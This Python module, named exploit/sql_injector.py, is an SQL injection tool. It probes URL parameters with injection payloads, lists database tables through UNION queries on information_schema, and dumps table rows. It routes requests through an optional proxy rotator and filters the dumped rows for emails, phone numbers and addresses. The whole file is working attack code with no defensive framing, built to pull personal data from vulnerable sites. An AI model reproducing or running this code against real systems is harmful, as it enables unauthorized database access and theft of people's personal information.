# exploit/sql_injector.py - SQL Injection Module
import requests, time, re
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse, quote

class SQLInjector:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
        
    def test_parameter(self, url, parameter):
        test_payloads = ["'", "' OR '1'='1", "' AND SLEEP(5)--"]
        
        for payload in test_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                if 'sql' in response.text.lower() or 'error' in response.text.lower():
                    return True
            except:
                pass
        
        return False
    
    def inject_payload(self, url, parameter, payload):
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        query_dict[parameter] = payload
        new_query = urlencode(query_dict, doseq=True)
        new_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        return new_url
    
    def get_tables(self, url, parameter):
        tables = []
        
        table_payloads = [
            f"' UNION SELECT table_name,null FROM information_schema.tables--",
            f"' UNION SELECT null,table_name FROM information_schema.tables--"
        ]
        
        for payload in table_payloads:
            test_url = self.inject_payload(url, parameter, payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                potential_tables = re.findall(r'\b\w+\b', response.text)
                
                for table in potential_tables:
                    if len(table) > 3 and table.isalnum():
                        tables.append(table)
                
                if tables:
                    break
                    
            except:
                pass
        
        return list(set(tables))[:50]
    
    def dump_table(self, url, parameter, table_name, limit=100):
        data = []
        
        columns = ['col1', 'col2', 'col3']
        columns_str = ','.join(columns)
        
        for i in range(0, limit, 10):
            data_payload = f"' UNION SELECT {columns_str} FROM {table_name} LIMIT {i},10--"
            test_url = self.inject_payload(url, parameter, data_payload)
            
            try:
                response = self.session.get(test_url, timeout=10)
                lines = response.text.split('\n')
                
                for line in lines:
                    if any(indicator in line.lower() for indicator in ['@', '.com', '08', 'jl.']):
                        cells = re.findall(r'>([^<]+)<', line)
                        row = {}
                        for j, col in enumerate(columns[:len(cells)]):
                            if j < len(cells):
                                row[col] = cells[j]
                        if row:
                            data.append(row)
                
                time.sleep(0.3)
                
            except:
                break
        
        return data[:limit]
